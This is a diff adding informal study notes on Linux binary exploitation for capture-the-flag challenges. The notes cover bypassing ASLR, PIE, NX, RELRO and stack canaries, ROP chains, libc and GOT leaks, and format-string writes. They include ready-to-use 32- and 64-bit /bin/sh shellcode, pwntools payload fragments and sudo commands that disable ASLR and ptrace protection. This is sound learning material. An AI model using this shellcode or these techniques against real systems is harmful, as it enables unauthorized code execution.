@@ -1,0 +1,198 @@
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
+
+Try to find another writeup to know another solution
+
+rbp-0x30 destination address of input
+rbp-0x1c target address
+so we need 0x30-0x1c for junk then value we need to write
+
+overwrite variable used for argument in puts to print what we want
+
+overwrite specifier in scanf to make us can input more payload ( example the specifier saved in variable )
+
+we can recvuntil one line before the input too
+
+32 bit = 4 byte
+64 bit = 8 byte
+
+patchelf
+
+64bit shellcode
+\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05
+
+32bit shellcode
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+
+ASLR - VMMAP
+while the addresses in a memory space will change, the offset between the addresses themselves will not change.So if we leak a single address from a memory region that we know what is, we can just add the offset to whatever address we want to know
+
+PIE
+Position Independent Executable (pie) is another binary mitigation extremely similar to aslr. It is basically aslr but for the actual binary's code / memory regions.
+gef➤  pie b *0x116f
+gef➤  pie run
+
+Nx is short-hand for Non-Executable stack. What this means is that the stack region of memory is not executable. 
+Enabled
+0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
+Disabled
+0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
+Error when running instructioon on stack (SIGSEV)
+
+RELRO
+Relro (Read only Relocation) affects the memory permissions similar to NX. The difference is whereas with NX it makes the stack executable, RELRO makes certain things read only so we can't write to them. 
+The most common way I've seen this be an obstacle is preventing us from doing a got table overwrite.
+gef➤  p fgets
+$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
+gef➤  search-pattern 0x7ffff7e4d100
+[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
+[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
+  0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
+gef➤  p fgets
+$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
+gef➤  search-pattern 0x7ffff7e4d100
+[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
+[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
+  0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
+  
+search-pattern 0x13290b34 // searching value
+knowing return address (rip) from info frame command
+
+integer = 4 bytes
+execve syscalls
+rax:  0x3b              Specify execve syscall
+rdi:  ptr to "/bin/sh"  Specify file to run
+rsi:  0x0               Specify no arguments
+rdx:  0x0               Specify no environment variables
+https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ 
+
+mov qword ptr [rax], rdx ; ret // writing rdx to any memory in rax
+
+write to where , search for null value in address
+add 4 bytes or integer as payload can see in 07-static-bkp
+0x0068732f6e69622f // /bin/sh
+
+if cannot set breakpoint , try to set follow-fork-mode child
+finish , exit from function
+bt (backtrace) . A backtrace is a summary of how your program got where it is. It shows one line per frame, for many frames, starting with the currently executing frame (frame zero), followed by its caller (frame one), and on up the stack. ( see address function called ). knowing function called using r then ctrl+c then bt
+
+payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
+payload += p32(0x0)            # ecx value
+payload += p32(0x80eb928)    # ebx value
+32 bit
+eax <- System Call Number
+ebx <- First Argument
+ecx <- Second Argument
+edx <- Third Argument
+	mov eax, 11
+	mov ebx, str
+	mov ecx, 0
+	mov edx, 0
+	int 0x80
+https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/03/30/return-oriented-programming-part2.html
+
+Canary
+For the canary it will have 4 bytes, one null byte and three random bytes (so only three bytes that we don't know).
+
+input will be reversed in stack, eg :ABCD will be DCBA in stack
+u32 ( convert string payload to int )
+
+knowing bss address -> info file
+
+/bin = 0x6e69622f
+/sh = 0x0068732f
+
+try to use ROP function to get gadget
+
+input 15935728
+search-pattern 15935728
+
+ROPgadget return 
+pop rax ; ret
+
+64 bit
+: mov qword ptr \[rax\]
+32 bit
+: mov dword ptr \[eax\]
+
+we can use syscall or int 0x80
+
+one gadget to get shell
+
+some binary cannot attached, like baby boi csaw19 ( bof dynnamic )
+knowing function address , libc.symbols['system']
+find string in libc libc.search('/bin/sh')
+
+lsb = least significant byte (last byte)
+leak canary with puts, store input until lsb of canary ( puts will print all input and canary )
+
+ The GOT table is a section of memory in the elf that holds various libc addresses.It does this so the binary knows where it can find those addresses, since it doesn't know what they will be when it compiles. Since PIE is disabled, the GOT entry addresses aren't randomized and we know what they are. So if we were to pass the GOT entry address for puts to puts (which we can call since it is an imported function, meaning it is compiled into the binary, and we know it's address because there is no pie) we will get the libc address of puts.
+ 
+ The plt address of puts (address of the imported function which we will use to call it), the address of the got entry of puts (holds the libc address), and a rop gadget to pop the got entry into the rdi register, and then return. 
+ plt address = elf.symbols['puts']
+ got address = elf.got['puts']
+ 
+leak libc using puts.got and gets.got , search in https://libc.blukat.me/.
+32 bit payload = [140 bytes buffer] + [puts()] + [main()] + [puts@got] // leak puts libc address (puts.got) using puts then back to main
+
+canary usually in rbp-8 for 64bit and rbp-4 for 32 bit
+
+puts(&buf); //leak canary with puts
+send make leak canary wrong ( svc ) ( different sendline and send ) , in case using read
+gdb show canary
+
+next(libc.search("/bin/sh"))
+puts got to leak is puts got from elf, but when puts got leaked , puts leak subtract with puts libc (libc.symbols['puts'])
+assign libc base with libc.address
+
+libc.sym == libc.symbols
+rop = ROP(elf) // executable
+(rop.find_gadget(['pop rdi', 'ret'])[0])
+
+send payload as float ( fb19_overfloat )
+float 4 byte
+
+libc base , first address in libc vmmap
+
+if segvault try to attach gdb then examine if the output is process 62485 is executing new program: /usr/bin/dash
+
+we can jump to any instruction in function , if there is pop rbp in frame ,we need to add 8 byte junk to payload as rbp then next instruction
+
+leak got with write instruction, set rdi to 1 (stdout) , set rdx to >= 8 ( to leak address ), set rsi to address to leak
+
+rsp in ret is next instruction
+
+disable aslr make it the rbp value wrong, so you need to enable it ( static address for rbp )
+
+if you need to debug you can do gdb.attach(r) and do breakpoint on new terminal
+
+p printf -> printf got ( check if got leak true , debug it then p function )
+
+if there is pop rbp we need to fill 8 byte junk to payload, so the 8 byte junk will be popped
+
+sometimes we need to recvuntil string that popped out before our input , just to get the right value for our leak ( sendline then recvuntil or we can just do same as usual )
+
+leak puts and gets got in 32bit
+payload += p32(elf.symbols["puts"])
+payload += p32(elf.symbols["puts"])
+payload += p32(elf.got["puts"])
+payload += p32(elf.got["gets"])
+
+leak puts got then go to vuln function
+payload += p32(elf.symbols["puts"])
+payload += p32(elf.symbols["vuln"])
+payload += p32(elf.got["puts"])
+
+we can pass our payload from binary using ./target | ./payload
+
+write address of target function to got of called function to make the target function called
+find got entry from function objdump -R 32_new | grep fflush
+knowing value for n byte written in target got : break after printf function then view value written in got address , x/2w got_address
+got = 0804a028
+value on got = 0x8704870b
+0804a028 = 0x0b
+0804a029 = 0x87
+and etc
+
+if flag loaded in memory we can leak it using printf
+
